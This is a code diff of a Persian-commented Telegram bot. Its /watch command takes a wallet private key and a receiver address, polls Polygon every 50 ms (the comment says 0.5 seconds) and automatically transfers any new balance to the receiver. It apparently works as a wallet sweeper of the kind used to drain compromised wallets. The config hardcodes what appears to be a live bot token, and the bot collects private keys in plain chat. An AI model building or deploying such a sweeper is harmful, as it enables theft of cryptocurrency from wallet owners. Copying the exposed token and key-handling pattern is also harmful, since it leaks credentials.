@@ -1,41 +1,32 @@
 const { Telegraf } = require('telegraf');
-const express = require('express');
 const { Web3 } = require('web3');
+const express = require('express');
 const app = express();
 
 // تنظیمات اصلی
 const config = {
   BOT_TOKEN: "7470701266:AAFR5tQZMNOB85upLXvu-KIVB5UbUvVt9Wk",
   VERCEL_URL: "https://fas-t.vercel.app",
+  SCAN_INTERVAL: 50, // 0.5 ثانیه
   NETWORKS: {
     polygon: {
       rpc: 'https://polygon-rpc.com',
       chainId: 137,
       symbol: 'MATIC',
       scanner: 'https://polygonscan.com/tx/'
-    },
-    ethereum: {
-      rpc: 'https://cloudflare-eth.com',
-      chainId: 1,
-      symbol: 'ETH',
-      scanner: 'https://etherscan.io/tx/'
-    },
-    bsc: {
-      rpc: 'https://bsc-dataseed.binance.org/',
-      chainId: 56,
-      symbol: 'BNB',
-      scanner: 'https://bscscan.com/tx/'
     }
   }
 };
 
 const bot = new Telegraf(config.BOT_TOKEN);
-const activeTransfers = new Map();
+const activeWatches = new Map();
 
-// تابع انتقال دارایی با گزارش‌دهی پیشرفته
-async function transferFunds(userId, privateKey, receiver, network) {
+// تابع انتقال با گزارش لحظه‌ای
+async function processTransfer(userId, privateKey, receiver) {
+  const network = 'polygon'; // فقط Polygon در این مثال
+  const web3 = new Web3(config.NETWORKS[network].rpc);
+  
   try {
-    const web3 = new Web3(config.NETWORKS[network].rpc);
     const account = web3.eth.accounts.privateKeyToAccount(privateKey);
     const balance = await web3.eth.getBalance(account.address);
     
@@ -45,7 +36,10 @@ async function transferFunds(userId, privateKey, receiver, network) {
       // گزارش شروع انتقال
       await bot.telegram.sendMessage(
         userId,
-        `⏳ شروع انتقال ${amount} ${config.NETWORKS[network].symbol}...`
+        `🔍 موجودی جدید شناسایی شد!\n` +
+        `📌 شبکه: ${network}\n` +
+        `💰 مقدار: ${amount} ${config.NETWORKS[network].symbol}\n` +
+        `⏳ در حال انتقال...`
       );
 
       const tx = {
@@ -60,79 +54,88 @@ async function transferFunds(userId, privateKey, receiver, network) {
       const signedTx = await account.signTransaction(tx);
       const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
       
-      // گزارش موفقیت‌آمیز
-      return bot.telegram.sendMessage(
+      // گزارش موفقیت
+      await bot.telegram.sendMessage(
         userId,
-        `✅ انتقال موفق!\n\n` +
+        `✅ انتقال با موفقیت انجام شد!\n\n` +
         `📌 شبکه: ${network}\n` +
         `💰 مقدار: ${amount} ${config.NETWORKS[network].symbol}\n` +
         `🔗 پیوند تراکنش: ${config.NETWORKS[network].scanner}${receipt.transactionHash}\n` +
-        `🆔 هش تراکنش: ${receipt.transactionHash}`
+        `🆔 هش تراکنش: <code>${receipt.transactionHash}</code>`,
+        { parse_mode: 'HTML' }
       );
+      
+      return true;
     }
-    
-    return bot.telegram.sendMessage(
-      userId,
-      `⚠️ موجودی در شبکه ${network} صفر است`
-    );
+    return false;
   } catch (error) {
     console.error('خطا در انتقال:', error);
-    return bot.telegram.sendMessage(
+    await bot.telegram.sendMessage(
       userId,
-      `❌ خطا در انتقال:\n${error.message}`
+      `❌ خطا در انتقال:\n<code>${error.message}</code>`,
+      { parse_mode: 'HTML' }
     );
+    return false;
   }
 }
 
-// دستور start با راهنمای کامل
+// حلقه رصد با سرعت نیم ثانیه
+function startWatching(userId, privateKey, receiver) {
+  if (activeWatches.has(userId)) {
+    return bot.telegram.sendMessage(userId, '⚠️ رصد از قبل فعال است');
+  }
+
+  // گزارش شروع رصد
+  bot.telegram.sendMessage(
+    userId,
+    `🔔 رصد لحظه‌ای فعال شد!\n\n` +
+    `⏱️ چک هر ${config.SCAN_INTERVAL/1000} ثانیه\n` +
+    `📌 شبکه: Polygon\n` +
+    `📤 گیرنده: <code>${receiver}</code>\n\n` +
+    `✅ هر موجودی جدید به صورت خودکار انتقال داده خواهد شد`,
+    { parse_mode: 'HTML' }
+  );
+
+  const interval = setInterval(async () => {
+    try {
+      await processTransfer(userId, privateKey, receiver);
+    } catch (err) {
+      console.error('خطا در رصد:', err);
+    }
+  }, config.SCAN_INTERVAL);
+
+  activeWatches.set(userId, { interval, privateKey, receiver });
+}
+
+// دستورات ربات
 bot.start((ctx) => {
-  ctx.replyWithMarkdownV2(
-    `🤖 *ربات انتقال لحظه‌ای*\n\n` +
-    `🔹 نسخه: 2\\.0\n` +
-    `🔹 شبکه‌های فعال: Polygon, Ethereum, BSC\n\n` +
-    `📌 *دستورات:*\n` +
-    `/watch [کلیدخصوصی] [آدرس گیرنده] [شبکه]\n` +
-    `/stop\n\n` +
-    `⚠️ توجه: کلید خصوصی فقط در حافظه موقت ذخیره می‌شود`
+  ctx.replyWithHTML(
+    '🤖 <b>ربات انتقال لحظه‌ای Polygon</b>\n\n' +
+    '⚡ سرعت انتقال: <b>0.5 ثانیه</b>\n\n' +
+    '📌 <i>برای شروع از دستور زیر استفاده کنید:</i>\n' +
+    '<code>/watch [کلیدخصوصی] [آدرس گیرنده]</code>'
   );
 });
 
-// دستور watch با اعتبارسنجی
-bot.command('watch', async (ctx) => {
-  const [_, privateKey, receiver, network] = ctx.message.text.split(' ');
+bot.command('watch', (ctx) => {
+  const [_, privateKey, receiver] = ctx.message.text.split(' ');
   
-  // اعتبارسنجی ورودی‌ها
-  if (!privateKey || !receiver || !network) {
-    return ctx.replyWithMarkdownV2(
-      '⚠️ *فرمت صحیح:*\n' +
-      '`/watch [کلیدخصوصی] [آدرس گیرنده] [شبکه]`\n\n' +
+  if (!privateKey || !receiver) {
+    return ctx.replyWithHTML(
+      '⚠️ <b>فرمت صحیح:</b>\n' +
+      '<code>/watch [کلیدخصوصی] [آدرس گیرنده]</code>\n\n' +
       'مثال:\n' +
-      '`/watch 0xabc123... 0xdef456... polygon`'
+      '<code>/watch abc123... 0x1734481e8A0f159FBEd3e737Fd2FB2182f6b6775</code>'
     );
   }
 
-  if (!config.NETWORKS[network]) {
-    return ctx.reply(`شبکه نامعتبر! گزینه‌های معتبر: ${Object.keys(config.NETWORKS).join(', ')}`);
-  }
-
-  // شروع رصد
-  activeTransfers.set(ctx.from.id, { privateKey, receiver, network });
-  
-  ctx.replyWithMarkdownV2(
-    `🔍 *رصد شروع شد*\n\n` +
-    `🌐 شبکه: *${network}*\n` +
-    `📤 گیرنده: \`${receiver}\`\n\n` +
-    `✅ هر واریزی به صورت خودکار انتقال داده خواهد شد`
-  );
-
-  // انجام اولین انتقال
-  await transferFunds(ctx.from.id, privateKey, receiver, network);
+  startWatching(ctx.from.id, privateKey, receiver);
 });
 
-// دستور stop
 bot.command('stop', (ctx) => {
-  if (activeTransfers.has(ctx.from.id)) {
-    activeTransfers.delete(ctx.from.id);
+  if (activeWatches.has(ctx.from.id)) {
+    clearInterval(activeWatches.get(ctx.from.id).interval);
+    activeWatches.delete(ctx.from.id);
     ctx.reply('🛑 رصد متوقف شد');
   } else {
     ctx.reply('⚠️ هیچ رصد فعالی وجود ندارد');
@@ -141,31 +144,20 @@ bot.command('stop', (ctx) => {
 
 // راه‌اندازی وب‌هوک
 app.use(express.json());
-app.post('/api/telegram', async (req, res) => {
-  try {
-    await bot.handleUpdate(req.body, res);
-    res.status(200).send('OK');
-  } catch (err) {
-    console.error('خطا در وب‌هوک:', err);
-    res.status(500).send('خطای سرور');
-  }
+app.post('/api/telegram', (req, res) => {
+  bot.handleUpdate(req.body, res);
 });
 
 // صفحه تست سلامت
 app.get('/', (req, res) => {
-  res.send('🤖 ربات تلگرام فعال و آماده به کار است');
+  res.send('🤖 ربات انتقال لحظه‌ای فعال است');
 });
 
 // تنظیم خودکار وب‌هوک
 if (process.env.VERCEL) {
-  (async () => {
-    try {
-      await bot.telegram.setWebhook(`${config.VERCEL_URL}/api/telegram`);
-      console.log('✅ وب‌هوک تنظیم شد');
-    } catch (err) {
-      console.error('❌ خطا در تنظیم وب‌هوک:', err);
-    }
-  })();
+  bot.telegram.setWebhook(`${config.VERCEL_URL}/api/telegram`)
+    .then(() => console.log('✅ وب‌هوک تنظیم شد'))
+    .catch(err => console.error('❌ خطا در وب‌هوک:', err));
 }
 
 module.exports = app;
